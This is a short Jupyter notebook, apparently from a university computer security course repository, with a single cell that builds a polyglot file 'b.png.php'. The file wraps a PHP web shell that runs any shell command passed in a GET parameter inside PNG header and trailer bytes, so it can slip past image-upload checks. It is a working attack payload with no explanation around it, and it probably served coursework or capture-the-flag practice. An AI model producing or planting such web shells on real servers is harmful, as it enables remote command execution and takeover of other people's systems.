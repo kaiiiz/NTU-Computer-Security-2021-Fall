{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "f7bda954-688c-4eed-a2c6-12d39b2fa7dc",
   "metadata": {},
   "outputs": [],
   "source": [
    "head = bytes.fromhex(\"8950 4e47 0d0a 1a0a 0000 000d 4948 4452 0000 019e 0000 01a6\")\n",
    "end = bytes.fromhex(\"0000 0000 4945 4e44 ae42 6082\")\n",
    "\n",
    "with open(\"b.png.php\", 'wb') as f:\n",
    "    f.write(head + b\"<?= shell_exec($_GET['code']); ?>\" + end)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
